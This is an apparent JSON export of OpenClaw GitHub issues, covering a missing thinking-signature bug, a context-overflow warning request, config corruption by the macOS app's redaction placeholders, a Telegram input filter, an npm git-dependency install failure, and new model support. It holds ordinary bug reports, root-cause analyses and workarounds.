          "createdAt": "2026-02-11T03:16:22Z",
          "updatedAt": "2026-02-11T03:16:22Z",
          "author": "qnlbnsl",
          "body": "+1 for this. \nHad to bump my default agent to a cheap model with an aggressive sandbox. This affects other experimental features as well that default to the default agent(Like the iOS app which is in alpha). \n\nUse Case: Email Triage via n8n sending web hooks (acting as a proxy preventing direct access)"
        }
      ]
    },
    {
      "number": 13834,
      "title": "Google Antigravity: thinking.signature field required but not sent",
      "body": "# Bug Report: Google Antigravity thinking.signature field required but not sent\n\n## Summary\n\nWhen using Google Antigravity provider (Claude via Google Cloud) with thinking enabled (default or explicit), all LLM requests fail with:\n\n```\nmessages.1.content.0.thinking.signature: Field required\n```\n\n## Environment\n\n- **OpenClaw Version**: 2026.2.9\n- **Provider**: google-antigravity\n- **Models Affected**: claude-sonnet-4-5, claude-opus-4-6-thinking (all Claude models via Antigravity)\n- **Platform**: Ubuntu 24.04 LTS (AWS EC2)\n\n## Reproduction\n\n### Minimal Reproduction (Cron Job)\n\n1. Create a cron with default thinking:\n```json\n{\n  \"name\": \"test-cron\",\n  \"schedule\": {\"kind\": \"every\", \"everyMs\": 900000},\n  \"payload\": {\n    \"kind\": \"agentTurn\",\n    \"message\": \"Simple task: echo hello\",\n    \"model\": \"claude-sonnet-4-5\"\n  },\n  \"sessionTarget\": \"isolated\"\n}\n```\n\n2. Execute cron\n3. Observe failure: `messages.1.content.0.thinking.signature: Field required`\n\n### Minimal Reproduction (Subagent)\n\n```javascript\nsessions_spawn({\n  task: \"Echo hello world\",\n  model: \"claude-sonnet-4-5\",\n  thinking: \"default\" // or omitted\n})\n```\n\n**Result**: Same error, subagent dies immediately.\n\n## Evidence\n\n### Session Log Excerpt\n\n```json\n{\n  \"type\": \"message\",\n  \"message\": {\n    \"role\": \"assistant\",\n    \"content\": [\n      {\n        \"type\": \"thinking\",\n        \"thinking\": \"This is a simple task...\"\n      }\n    ],\n    \"stopReason\": \"error\",\n    \"errorMessage\": \"Cloud Code Assist API error (400): {\\\"type\\\":\\\"error\\\",\\\"error\\\":{\\\"type\\\":\\\"invalid_request_error\\\",\\\"message\\\":\\\"messages.1.content.0.thinking.signature: Field required\\\"}}\"\n  }\n}\n```\n\n### Impact\n\n**100% failure rate** for any task using `<thinking>` tags with Google Antigravity.\n\n## Root Cause Analysis\n\n1. **OpenClaw/pi-ai** sends messages with `<thinking>` content blocks\n2. **Google Antigravity API** validates request and expects `thinking.signature` field\n3. **OpenClaw does NOT include** this field in the request\n4. **API rejects** with 400 Bad Request\n\n### Code Location\n\nLikely in: `/node_modules/@mariozechner/pi-ai/dist/providers/google-antigravity.js`\n\nThe transform-messages.js file mentions \"thinking signatures\" but doesn't appear to add the required field.\n\n## Workaround\n\n**Disable thinking in all crons/subagents:**\n\n```json\n{\n  \"payload\": {\n    \"thinking\": \"off\"\n  }\n}\n```\n\nOr for subagents:\n\n```javascript\nsessions_spawn({\n  task: \"...\",\n  thinking: \"off\"\n})\n```\n\n**Verification**: All operations work perfectly with `thinking: off`.\n\n## Expected Behavior\n\nOne of:\n1. OpenClaw should include `thinking.signature` field when sending to Google Antigravity\n2. OpenClaw should automatically disable thinking for Google Antigravity provider\n3. Error should be caught and gracefully fallback to thinking=off\n\n## Actual Behavior\n\n- Silent failures in crons (appear to run but produce no output)\n- Subagent crashes with error message\n- No automatic recovery or fallback\n\n## Impact\n\n**Before workaround**:\n- ❌ 0% success rate for crons/subagents\n- ❌ Autonomous systems non-functional\n\n**After workaround** (thinking=off):\n- ✅ 100% success rate\n- ✅ All operations working\n\n## Proposed Fix\n\nAdd `thinking.signature` field in Google Antigravity provider when `<thinking>` blocks are present:\n\n```javascript\n// In google-antigravity.js or transform-messages.js\nif (content.type === 'thinking' && !content.signature) {\n  content.signature = generateThinkingSignature(content.thinking);\n}\n```\n\nOr document that Google Antigravity requires `thinking: off`.\n\n---\n\n**Reporter**: OpenClaw user  \n**Date**: 2026-02-11  \n**Severity**: High (blocks autonomous operation)  \n**Workaround Available**: Yes (thinking=off)\n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13834",
      "createdAt": "2026-02-11T02:51:59Z",
      "updatedAt": "2026-02-11T03:13:01Z",
      "author": "juboyy",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881858573,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13834#issuecomment-3881858573",
          "createdAt": "2026-02-11T03:02:20Z",
          "updatedAt": "2026-02-11T03:02:20Z",
          "author": "juboyy",
          "body": "Closing - workaround implemented locally. Will monitor if upstream fix is needed."
        }
      ]
    },
    {
      "number": 13097,
      "title": "Feature: Context overflow warning before hitting limit",
      "body": "## Problem\n\nWhen a session approaches the model's context limit, the user gets a hard failure:\n```\n⚠️ Context overflow — prompt too large for this model. Try a shorter message or a larger-context model.\n```\n\nThis is abrupt and loses the user's message. There's no way to know you're approaching the limit until you hit it.\n\n## Proposed Solution\n\nAdd a **warning threshold** (e.g., 80-90% of context) that:\n\n1. **Warns the user** before overflow:\n   ```\n   ⚠️ Context at 85% capacity. Consider using /forget or /new soon.\n   ```\n\n2. **Optionally auto-compact** when threshold is reached (configurable)\n\n3. **Show context usage** in `/status` output (tokens used / max)\n\n## Benefits\n\n- Users can proactively manage context before losing messages\n- Better UX than hard failures\n- Helps users understand when to start fresh sessions\n- Could enable smarter auto-compaction strategies\n\n## Configuration (suggested)\n\n```yaml\ncontextWarning:\n  enabled: true\n  threshold: 0.85  # warn at 85%\n  autoCompact: false  # or true to auto-compact at threshold\n```\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13097",
      "createdAt": "2026-02-10T03:59:44Z",
      "updatedAt": "2026-02-11T03:10:18Z",
      "author": "warringk",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3879183341,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13097#issuecomment-3879183341",
          "createdAt": "2026-02-10T16:37:15Z",
          "updatedAt": "2026-02-10T16:37:15Z",
          "author": "ukr-coder",
          "body": "**Confirmed — this is a significant UX problem.**\n\nWe run long strategic sessions (8+ hours) on Opus with heavy tool use, and we've documented the following thresholds from real-world experience:\n\n| Session size | Behavior |\n|---|---|\n| < 3.0 MB | Normal operation |\n| 3.0 - 3.8 MB | Noticeable latency increase, should warn |\n| > 3.8 MB | Webchat starts struggling |\n| > 4.0 MB | Webchat crashes / becomes unresponsive |\n\nThe current behavior is a hard wall with no warning. By the time you hit it, you've already lost the message that pushed you over.\n\n### What we've done as a workaround\nWe check session file size every heartbeat via PowerShell and trigger manual compaction. It works, but it's duct tape.\n\n### Suggestions beyond the original proposal\n\n1. **Show current context usage in `session_status`** — even before any threshold is hit, users should be able to see \"Context: 65% (520K / 800K tokens)\" at any time. This creates awareness.\n\n2. **Pre-compaction hook** — before auto-compacting, fire a hook so the agent can flush important state to files (memory flush). We've lost context during surprise compactions because the agent didn't get a chance to persist.\n\n3. **Webchat-specific threshold** — webchat seems to have a lower effective limit than the model's context window. The warning should account for the delivery channel, not just the model.\n\nThe 80-85% threshold in the original proposal is a good default. Would also suggest making it configurable per-agent, since some agents (coding) can tolerate aggressive compaction while others (strategic planning) need the full context.\n"
        },
        {
          "id": 3881876899,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13097#issuecomment-3881876899",
          "createdAt": "2026-02-11T03:10:18Z",
          "updatedAt": "2026-02-11T03:10:18Z",
          "author": "napetrov",
          "body": "👍 Strong +1 for this feature. \n\n**Use case:** Running multi-agent setup with 16+ agents across different Telegram groups. Group chat sessions accumulate history quickly and hit context overflow without warning.\n\n**Current workaround:** Manual session reset by deleting session entry from `sessions.json` and archiving the transcript. Would love automatic compaction or at least a warning threshold.\n\n**Suggested addition:** Option to auto-reset (not just compact) for group chat sessions where preserving full history isn't critical."
        }
      ]
    },
    {
      "number": 11355,
      "title": "[Bug]: macOS app overwrites gateway config, replacing real values with __OPENCLAW_REDACTED__",
      "body": "# [Bug]: macOS app overwrites gateway config, replacing real values with `__OPENCLAW_REDACTED__`\n\n## Summary\n\nThe macOS app (2026.2.6, build 9039) progressively corrupts the gateway config JSON by replacing real values with the literal string `__OPENCLAW_REDACTED__`. This causes the gateway to fail on restart because it can't parse `__OPENCLAW_REDACTED__` as valid values (e.g., numbers for MaxTokens/ContextTokens).\n\n## Steps to reproduce\n\n1. Have a working gateway config with valid values\n2. Install and launch OpenClaw macOS app (2026.2.6)\n3. App connects to the local gateway in local mode\n4. Config values start being replaced with `__OPENCLAW_REDACTED__`\n5. Gateway fails to restart\n\n## Expected behavior\n\nThe macOS app should never write redacted placeholder values back to the config file. `__OPENCLAW_REDACTED__` is a display-only marker from `gateway config.get` and should never be persisted.\n\n## Actual behavior\n\n- Initially noticed `MaxTokens` and `ContextTokens` replaced with `__OPENCLAW_REDACTED__`\n- Over time, additional config fields were also being replaced with `__OPENCLAW_REDACTED__`\n- The corruption is progressive — more fields get redacted the longer the app runs\n- Gateway cannot restart until the corrupted values are manually removed or the config is reverted from backup\n\n## Workaround\n\n- Revert to a backup copy of the gateway config JSON\n- Or manually remove/fix the lines containing `__OPENCLAW_REDACTED__`\n- Uninstall/quit the macOS app to prevent further corruption\n\n## Root cause (suspected)\n\nThe macOS app appears to be reading the config via `config.get` (which redacts sensitive values for security), then writing that redacted output back to the actual config file. This creates a destructive read-modify-write cycle where real values are permanently replaced with redaction placeholders.\n\n## Environment\n\n- OpenClaw version: 2026.2.6-3\n- macOS app: 2026.2.6 (build 9039)\n- OS: macOS (Darwin 25.2.0, arm64) — Mac mini M4\n- Node.js: v22.22.0\n- Mode: local\n",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11355",
      "createdAt": "2026-02-07T18:36:44Z",
      "updatedAt": "2026-02-11T03:07:29Z",
      "author": "knoxxer",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3866115556,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11355#issuecomment-3866115556",
          "createdAt": "2026-02-08T04:27:09Z",
          "updatedAt": "2026-02-08T04:27:09Z",
          "author": "acy103",
          "body": "## Root Cause Analysis — Three-Bug Convergence\n\n### Summary\n\nThe macOS app's Settings → General tab triggers a chain of three independent bugs that converge to overwrite real config values with `__OPENCLAW_REDACTED__` strings. The core issue is that `redactObject()` is type-blind (replaces booleans with strings), the gateway's `config.set` validates *before* restoring redacted values, and `ConfigStore.save()` has an unprotected fallback that writes directly to disk when the RPC fails.\n\n**Precise workaround:** Avoid opening Settings → General tab. All other Settings tabs are safe.\n\n---\n\n### Bug 1: Type-blind redaction in `redactObject()`\n\n**File:** `src/config/redact-snapshot.ts:15, 36–38`\n\n`SENSITIVE_KEY_PATTERNS` includes `/token/i`, which matches keys like `userTokenReadOnly` (a Slack config boolean). The redaction logic replaces *any* non-null value — including booleans — with the string sentinel `\"__OPENCLAW_REDACTED__\"`:\n\n```typescript\n// Line 15\nconst SENSITIVE_KEY_PATTERNS = [/token/i, /password/i, /secret/i, /api.?key/i];\n\n// Lines 36–38\nif (isSensitiveKey(key) && value !== null && value !== undefined) {\n  result[key] = REDACTED_SENTINEL;  // boolean true → string \"__OPENCLAW_REDACTED__\"\n}\n```\n\n**Impact:** `userTokenReadOnly: true` (boolean) becomes `userTokenReadOnly: \"__OPENCLAW_REDACTED__\"` (string) in the redacted snapshot returned by `config.get`.\n\n---\n\n### Bug 2: Validation-before-restore order in `config.set`\n\n**File:** `src/gateway/server-methods/config.ts:182 vs 195`\n\nThe `config.set` RPC handler runs `validateConfigObjectWithPlugins()` (line 182) *before* `restoreRedactedValues()` (line 195). When the redacted boolean-turned-string arrives, Zod validation rejects it because the schema expects a boolean, not a string:\n\n```typescript\n// Line 182 — validation runs first\nconst validated = validateConfigObjectWithPlugins(parsedRes.parsed);\n// ↑ fails here: userTokenReadOnly expected boolean, got string\n\n// Line 195 — restore would fix it, but never reached\nrestored = restoreRedactedValues(validated.config, snapshot.config);\n```\n\n**Impact:** The `config.set` RPC is rejected. The redacted values are never restored.\n\n---\n\n### Bug 3: Unprotected fallback in `ConfigStore.save()`\n\n**File:** `apps/macos/Sources/OpenClaw/ConfigStore.swift:63–66`\n\nWhen `saveToGateway()` throws (because Bug 2 rejected the RPC), the catch block falls through to `OpenClawConfigFile.saveDict()`, which writes the full redacted config root directly to disk — bypassing all gateway validation and restoration logic:\n\n```swift\n// Lines 63–66\ndo {\n    try await self.saveToGateway(root)\n} catch {\n    OpenClawConfigFile.saveDict(root)  // writes redacted values to disk\n}\n```\n\n**Impact:** The redacted config (with `__OPENCLAW_REDACTED__` replacing real values) is persisted to `~/.openclaw/openclaw.json`.\n\n---\n\n### Trigger Path\n\n1. User opens **Settings → General** tab in the macOS app\n2. `TailscaleIntegrationSection` (embedded in General tab) fires a `.task` that loads config via `config.get` RPC → receives **redacted** snapshot\n3. `.onChange` triggers `applySettings()` → calls `ConfigStore.save()` with the full redacted root\n4. `saveToGateway()` sends `config.set` RPC → **rejected** by Zod validation (Bug 2)\n5. Catch block falls through → `OpenClawConfigFile.saveDict()` writes redacted config to disk (Bug 3)\n\nOther Settings tabs (Channels, Connections, etc.) do not load the full root config through this path, so they are safe.\n\n---\n\n### Who Is Affected\n\nEnvironments with **Slack integration** are most likely to trigger this, because Slack config contains `userTokenReadOnly` (a boolean field whose key matches `/token/i`). Environments without any boolean-valued keys matching the sensitive patterns may not trigger Bug 2's validation failure, so the fallback write may succeed without corruption — or may corrupt string token values silently.\n\n---\n\n### Suggested Fixes\n\n1. **Bug 1:** Make `redactObject()` type-aware — only redact string values (skip booleans, numbers, etc.), or use an allowlist of known credential keys instead of broad regex matching.\n2. **Bug 2:** Swap the order — call `restoreRedactedValues()` *before* `validateConfigObjectWithPlugins()`, or validate after restoration.\n3. **Bug 3:** Remove the silent disk fallback in `ConfigStore.save()` — if the gateway rejects the write, surface the error rather than persisting potentially corrupted data.\n\n---\n\n### Environment\n\n- OpenClaw version: 2026.2.6-3\n- macOS 26.2\n- Trigger: Settings → General tab in the macOS menu bar app\n"
        },
        {
          "id": 3867522693,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11355#issuecomment-3867522693",
          "createdAt": "2026-02-08T16:41:30Z",
          "updatedAt": "2026-02-08T16:41:30Z",
          "author": "Foxtr0t1337",
          "body": "Same.\nIt messed me up because I didn't use source control for `~/.openclaw`\nHave to manually reconfigure 5+ tokens.\nFor now I just **disabled that function** with early return, hoping someone fix it soon."
        },
        {
          "id": 3881811322,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11355#issuecomment-3881811322",
          "createdAt": "2026-02-11T02:45:47Z",
          "updatedAt": "2026-02-11T02:45:47Z",
          "author": "GeezusChrotch",
          "body": "Adding another data point: the same REDACTED corruption happens via the `gateway config.patch` tool as well.\n\n**What happened to us today:**\n1. Called `gateway config.patch` to add a `talk` section to config\n2. The tool read the config via `config.get` (which returns REDACTED placeholders for secrets)\n3. Merged my patch with the redacted config object\n4. Wrote the result back to `~/.openclaw/openclaw.json` with `__OPENCLAW_REDACTED__` as literal values\n\n**Result:** 12 secrets nuked (Telegram bot token, ElevenLabs API key, Perplexity key, Google Places, gateway auth tokens, etc.)\n\n**Root cause (from `dist/gateway-cli-DZge3TdL.js`):**\n- `redactObject()` replaces sensitive values with `__OPENCLAW_REDACTED__`\n- `config.patch` doesn't preserve original values for keys that aren't being patched\n- It writes back the redacted merged object directly\n\n**Workaround:** Edit `~/.openclaw/openclaw.json` directly—don't use the Mac app's config UI or `config.patch` for anything touching secrets.\n\nThis is a dangerous bug that's easy to hit and hard to diagnose (REDACTED looks intentional). Hope it gets prioritized for a fix soon.\n\nThanks for reporting!"
        },
        {
          "id": 3881868590,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11355#issuecomment-3881868590",
          "createdAt": "2026-02-11T03:06:38Z",
          "updatedAt": "2026-02-11T03:07:29Z",
          "author": "Foxtr0t1337",
          "body": "> don't use the Mac app's config UI\n\nI think Mac app will auto save tailscale config, so every time you open the settings, it will try to nuke?\nHave anyone tried the 2026.2.9 update? I didn't see it in the change log, I didn't dare to update."
        }
      ]
    },
    {
      "number": 13844,
      "title": "Feature request: inputFilter / ignorePatterns for channel messages",
      "body": "## Problem\n\nWhen clearing the Telegram chat window, the app automatically sends `/start` to the bot. This triggers a full agent turn (token cost + unnecessary response) even though it's not a real user message.\n\nThere's currently no way to configure the gateway to silently drop or ignore specific message patterns before they reach the agent.\n\n## Proposed Solution\n\nAdd an `inputFilter` or `ignorePatterns` config option at the channel level (or global level) that drops matching messages before they're routed to the agent session.\n\nExample config:\n\n```json5\n{\n  channels: {\n    telegram: {\n      ignorePatterns: [\"/start\", \"/help\"],\n      // or regex:\n      // inputFilter: { drop: [\"^/start$\", \"^/help$\"] }\n    }\n  }\n}\n```\n\nMessages matching these patterns would be silently dropped — no agent turn, no token cost, no response.\n\n## Alternatives Considered\n\n1. **Agent-side NO_REPLY** — works but still burns tokens for a full round-trip\n2. **BotFather /setcommands** — removes the menu button but doesn't prevent the message if the user types it manually or the app sends it on chat clear\n3. **Native command override** — could work for `/start` specifically but doesn't generalize\n\n## Use Cases\n\n- Suppress Telegram's auto-sent `/start` on chat clear\n- Ignore common bot commands that aren't relevant (`/help`, `/settings`)\n- Filter spam patterns in group chats before they reach the agent\n- Drop platform-specific noise (join/leave notifications, etc.)\n\n## Context\n\nTelegram specifically sends `/start` when a user clears the chat window or opens the bot for the first time. This is a platform behavior that can't be disabled client-side.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13844",
      "createdAt": "2026-02-11T03:07:02Z",
      "updatedAt": "2026-02-11T03:07:02Z",
      "author": "firstmovr",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 12841,
      "title": "[Bug]:  `npm install -g openclaw` fails in environments without GitHub SSH keys",
      "body": "## Summary\n\n`npm install -g openclaw@latest` fails on first run in any environment without GitHub SSH keys configured. The root cause is `@whiskeysockets/baileys@7.0.0-rc.9` declaring `libsignal` as a raw git URL (`git+https://github.com/whiskeysockets/libsignal-node`) instead of using the npm-published `@whiskeysockets/libsignal-node@2.0.1`. npm rewrites this to an SSH git operation that requires GitHub auth.\n\nThis breaks Docker containers, CI runners, fresh VMs, and cloud dev environments out of the box.\n\nRetrying after the failure hits a secondary issue: npm leaves a stale temp directory behind (`.openclaw-ScBINLhf`), causing an `ENOTEMPTY` error that requires manual cleanup before the install can succeed.\n\nDependency chain:\n```\nopenclaw@2026.2.9\n  └── @whiskeysockets/baileys@7.0.0-rc.9\n        └── libsignal: \"git+https://github.com/whiskeysockets/libsignal-node\"\n```\n\n## Steps to reproduce\n\n1. Spin up any clean environment without GitHub SSH keys (Docker container, fresh VM, CI runner)\n2. Run `npm install -g openclaw@latest`\n3. Install fails with `Permission denied (publickey)`\n4. Retry `npm install -g openclaw@latest`\n5. Retry fails with `ENOTEMPTY` because npm didn't clean up after step 3\n\n## Expected behavior\n\n`npm install -g openclaw` should succeed without requiring GitHub SSH keys. All transitive dependencies should resolve from the npm registry.\n\n## Actual behavior\n\nFirst attempt fails with a git SSH auth error:\n```\nnpm error code 128\nnpm error An unknown git error occurred\nnpm error command git --no-replace-objects ls-remote ssh://git@github.com/whiskeysockets/libsignal-node.git\nnpm error git@github.com: Permission denied (publickey).\nnpm error fatal: Could not read from remote repository.\n```\n\nSecond attempt fails because npm left a partial install behind:\n```\nnpm error ENOTEMPTY: directory not empty, rename '/path/to/node_modules/openclaw' -> '/path/to/node_modules/.openclaw-ScBINLhf'\n```\n\nAfter manually removing the stale temp dir (`rm -rf .../node_modules/.openclaw-ScBINLhf`) and retrying, the install eventually succeeds — npm appears to fall back to the registry-published version on subsequent attempts.\n\n## Environment\n\n- Clawdbot version: 2026.2.9\n- OS: Ubuntu (Docker container, no GitHub SSH keys)\n- Install method: `npm install -g openclaw@latest`\n- Node.js: v22.22.0\n- npm: 10.9.4\n\n## Logs or screenshots\n\nFull npm debug log from the first failure:\n```\nverbose stack Error: An unknown git error occurred\nverbose stack     at makeError (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/git/lib/make-error.js:28:13)\nverbose stack     at /mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/git/lib/spawn.js:37:26\nverbose stack     at async module.exports (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/git/lib/revs.js:18:22)\nverbose stack     at async /mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/pacote/lib/git.js:258:19\nverbose stack     at async withTempDir (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/fs/lib/with-temp-dir.js:21:14)\nverbose stack     at async #fetchManifest (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:1202:20)\nverbose stack     at async #nodeFromEdge (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:1040:19)\nverbose stack     at async #buildDepStep (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:904:11)\nverbose stack     at async Arborist.buildIdealTree (/mise/installs/node/22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:181:7)\nerror code 128\nerror command git --no-replace-objects ls-remote ssh://git@github.com/whiskeysockets/libsignal-node.git\nerror git@github.com: Permission denied (publickey).\nerror fatal: Could not read from remote repository.\n```\n\n**Suggested fixes:**\n\n1. **Upstream (preferred):** Get `@whiskeysockets/baileys` to use `@whiskeysockets/libsignal-node@^2.0.1` from npm instead of the git URL.\n2. **Override workaround:** Add to `package.json`:\n   ```json\n   \"overrides\": {\n     \"@whiskeysockets/baileys\": {\n       \"libsignal\": \"npm:@whiskeysockets/libsignal-node@^2.0.1\"\n     }\n   }\n   ```\n3. **Make WhatsApp optional:** Move `@whiskeysockets/baileys` to `optionalDependencies` so the base install doesn't blow up for users who don't need WhatsApp.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12841",
      "createdAt": "2026-02-09T19:59:53Z",
      "updatedAt": "2026-02-11T03:04:40Z",
      "author": "nachoaIvarez",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881863999,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12841#issuecomment-3881863999",
          "createdAt": "2026-02-11T03:04:40Z",
          "updatedAt": "2026-02-11T03:04:40Z",
          "author": "wukaikailive",
          "body": "how to fixed this?\n"
        }
      ]
    },
    {
      "number": 10374,
      "title": "Support new models: Claude Opus 4.6 and OpenAI Codex 5.3",
      "body": "Hi OpenClaw team,\n\nCould you please add support for the newly released models **Claude Opus 4.6** and **OpenAI Codex 5.3**?\n\n### Why this matters\n- Users want to select these models via OpenClaw’s model override / configuration (similar to existing model aliases).\n- Having first-class support (validation, routing, and docs) would make adoption much smoother.\n\n### Requested support\n1. Allow specifying these models in config and CLI model overrides (including alias support if applicable).\n2. Ensure provider/model mapping is recognized (no “unknown model” validation errors).\n3. Document the exact model identifiers and any special parameters/limits.\n4. If there are compatibility concerns, please share recommended fallback models.\n\n### Environment\n- OpenClaw version: 2026.2.2-3\n- Platform: macOS (Chrome relay used for browser automation)\n\nThanks!",
      "state": "open",
      "comments": 14,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374",
      "createdAt": "2026-02-06T11:53:09Z",
      "updatedAt": "2026-02-11T03:01:34Z",
      "author": "Mokoby",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3860193582,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3860193582",
          "createdAt": "2026-02-06T12:34:45Z",
          "updatedAt": "2026-02-06T12:59:48Z",
          "author": "josscit",
          "body": "## Workaround for Opus 4.6 (works right now on v2026.2.3)\n\nFor anyone who wants to use Claude Opus 4.6 without waiting for the next release — here's a quick workaround I've been using since yesterday, fully tested.\n\n### Why it works\n\nOpenClaw's model catalog comes from the `@mariozechner/pi-ai` library. Version **0.52.0** (already on npm) includes Opus 4.6, but OpenClaw v2026.2.3 still bundles v0.51.3.\n\n### Steps (2 minutes)\n\n1. **Download the updated file:**\n```\ncurl -o models.generated.js \"https://unpkg.com/@mariozechner/pi-ai@0.52.0/dist/models.generated.js\"\n```\n\n2. **Replace it in your OpenClaw installation:**\n```bash\n# Find your OpenClaw install path\nnpm list -g openclaw\n\n# Copy the file (adjust path as needed)\ncp models.generated.js <openclaw_path>/node_modules/@mariozechner/pi-ai/dist/models.generated.js\n```\n\n3. **Update your config:**\n```json\n\"model\": {\n  \"primary\": \"anthropic/claude-opus-4-6\"\n}\n```\n\n4. **Restart the gateway**\n\n### Result\n- No rebuild needed\n- No other files touched\n- 1M token context window works\n- At the next `openclaw update`, this file gets overwritten with native support (PR #9853 already merged on main)\n\nI wrote a more detailed guide here: [Full step-by-step guide on LinkedIn](https://www.linkedin.com/pulse/how-run-claude-opus-46-openclaw-right-now-2-minute-fix-citerna-cqycf/)\n```\n\nHope this helps while we wait for v2026.2.4!"
        },
        {
          "id": 3860223587,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3860223587",
          "createdAt": "2026-02-06T12:40:58Z",
          "updatedAt": "2026-02-06T12:40:58Z",
          "author": "josscit",
          "body": "Regarding **Codex 5.3**: I checked the updated `@mariozechner/pi-ai` v0.52.0 model catalog and I don't see Codex 5.3 listed in the OpenAI provider section. The workaround above works for Opus 4.6 because the library already has it, but Codex 5.3 may need to be added to the catalog first (either by the pi-ai maintainer or directly by the OpenClaw team).\n\nIf anyone finds the exact model ID for Codex 5.3, it might be possible to add it manually to the same `models.generated.js` file — but that would require knowing the correct API parameters, pricing, and context window."
        },
        {
          "id": 3860347270,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3860347270",
          "createdAt": "2026-02-06T13:06:24Z",
          "updatedAt": "2026-02-06T13:06:24Z",
          "author": "slonce70",
          "body": "Thanks for reporting this.\n\nThis is already implemented on `main`:\n- Claude Opus 4.6 support landed in PR #9853.\n- OpenAI Codex `gpt-5.3-codex` routing/fallback landed in PR #9995.\n\nThe request here is therefore resolved in source and should be available in the next release cut from `main`.\n"
        },
        {
          "id": 3860540351,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3860540351",
          "createdAt": "2026-02-06T13:41:09Z",
          "updatedAt": "2026-02-06T13:41:09Z",
          "author": "Mokoby",
          "body": "thanks,josscit  slence70."
        },
        {
          "id": 3860543980,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3860543980",
          "createdAt": "2026-02-06T13:41:40Z",
          "updatedAt": "2026-02-06T13:41:40Z",
          "author": "josscit",
          "body": "Thanks @slonce70 for confirming! Looking forward to the next release cut."
        },
        {
          "id": 3860793164,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3860793164",
          "createdAt": "2026-02-06T14:30:28Z",
          "updatedAt": "2026-02-06T14:33:09Z",
          "author": "sebastienbo",
          "body": "> ## Workaround for Opus 4.6 (works right now on v2026.2.3)\n> For anyone who wants to use Claude Opus 4.6 without waiting for the next release — here's a quick workaround I've been using since yesterday, fully tested.\n> \n> ### Why it works\n> OpenClaw's model catalog comes from the `@mariozechner/pi-ai` library. Version **0.52.0** (already on npm) includes Opus 4.6, but OpenClaw v2026.2.3 still bundles v0.51.3.\n> \n> ### Steps (2 minutes)\n> 1. **Download the updated file:**\n> \n> ```\n> curl -o models.generated.js \"https://unpkg.com/@mariozechner/pi-ai@0.52.0/dist/models.generated.js\"\n> ```\n> \n> 2. **Replace it in your OpenClaw installation:**\n> \n> # Find your OpenClaw install path\n> npm list -g openclaw\n> \n> # Copy the file (adjust path as needed)\n> cp models.generated.js <openclaw_path>/node_modules/@mariozechner/pi-ai/dist/models.generated.js\n> 3. **Update your config:**\n> \n> \"model\": {\n>   \"primary\": \"anthropic/claude-opus-4-6\"\n> }\n> 4. **Restart the gateway**\n> \n> ### Result\n> * No rebuild needed\n> * No other files touched\n> * 1M token context window works\n> * At the next `openclaw update`, this file gets overwritten with native support (PR [feat: add Claude Opus 4.6 to built-in model catalog #9853](https://github.com/openclaw/openclaw/pull/9853) already merged on main)\n> \n> I wrote a more detailed guide here: [Full step-by-step guide on LinkedIn](https://www.linkedin.com/pulse/how-run-claude-opus-46-openclaw-right-now-2-minute-fix-citerna-cqycf/)\n> \n> ```\n> \n> Hope this helps while we wait for v2026.2.4!\n> ```\n\nThanks, I gave your post content to my OpenClaw and it self-executed all those steps :-)\n\nI used the prompt that you posted on linkedin: \n\nDownload models.generated.js from unpkg.com/@mariozechner/pi-ai@0.52.0/dist/models.generated.js and replace the one in your OpenClaw node_modules. Then update my config to use anthropic/claude-opus-4-6 and restart the gateway.\n"
        },
        {
          "id": 3861405809,
